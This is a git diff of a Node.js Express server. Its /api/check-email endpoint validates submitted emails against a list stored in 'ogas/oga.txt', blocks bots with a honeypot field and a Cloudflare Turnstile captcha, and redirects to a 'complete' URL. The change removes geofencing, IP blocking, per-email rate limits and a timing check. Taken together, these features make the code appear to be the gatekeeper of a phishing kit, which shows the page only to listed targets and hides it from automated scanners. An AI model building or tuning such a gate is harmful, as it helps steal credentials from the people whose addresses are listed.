@@ -12,15 +12,6 @@ const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
 const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';
 
-// Allow/Block IP and Country
-const ALLOWED_COUNTRIES = ['US', 'GB', 'CA', 'UK', 'FR'];
-const BLOCKED_IPS = new Set(['192.0.2.1', '203.0.113.5']);
-
-// Email rate limiter storage
-const emailRateLimiter = new Map();
-const MAX_EMAIL_ATTEMPTS = 5;
-const EMAIL_WINDOW_MS = 10 * 60 * 1000; // 10 minutes
-
 let validEmails = new Set();
 function loadEmails() {
   try {
@@ -44,20 +35,12 @@ app.use(express.json());
 app.use(limiter);
 
 app.post('/api/check-email', async (req, res) => {
-  const { email, captchaToken, middleName, clientTimestamp } = req.body;
+  const { email, captchaToken, middleName } = req.body;
 
   // Honeypot detection
   if (middleName && middleName.trim() !== '') {
     console.warn('[BOT] Honeypot field triggered');
     return res.status(403).json({ valid: false, message: 'Bot activity detected' });
-  }
-
-  // Client-side timing protection
-  const now = Date.now();
-  const timeSinceLoad = now - (parseInt(clientTimestamp) || now);
-  if (timeSinceLoad < 2000) {
-    console.warn('[BOT] Too fast interaction detected');
-    return res.status(429).json({ valid: false, message: 'Interaction too fast. Try again.' });
   }
 
   // Email format validation
@@ -66,23 +49,9 @@ app.post('/api/check-email', async (req, res) => {
     return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
   }
 
-  // Rate limit by email
-  const nowWindow = Date.now();
-  const record = emailRateLimiter.get(email.toLowerCase()) || { count: 0, first: nowWindow };
-  if (nowWindow - record.first < EMAIL_WINDOW_MS) {
-    if (record.count >= MAX_EMAIL_ATTEMPTS) {
-      return res.status(429).json({ valid: false, message: 'Too many attempts with this email. Try again later.' });
-    }
-    record.count++;
-  } else {
-    record.count = 1;
-    record.first = nowWindow;
-  }
-  emailRateLimiter.set(email.toLowerCase(), record);
-
-  // Captcha verification
+  // CAPTCHA check
   if (!captchaToken) {
-    console.warn('[WARN] Missing captcha token attempt');
+    console.warn('[WARN] Missing CAPTCHA token');
     return res.status(400).json({ valid: false, message: 'Captcha missing' });
   }
 
@@ -90,16 +59,17 @@ app.post('/api/check-email', async (req, res) => {
     const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
+      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`
     });
     const verifyData = await verifyRes.json();
+
     if (!verifyData.success) {
-      console.warn('[WARN] Captcha verification failed:', verifyData);
-      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page' });
+      console.warn('[WARN] CAPTCHA failed:', verifyData);
+      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page.' });
     }
   } catch (err) {
-    console.error('[ERROR] Captcha verification error:', err);
-    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
+    console.error('[ERROR] CAPTCHA validation error:', err);
+    return res.status(500).json({ valid: false, message: 'Internal server error during captcha check' });
   }
 
   const normalizedEmail = email.toLowerCase();
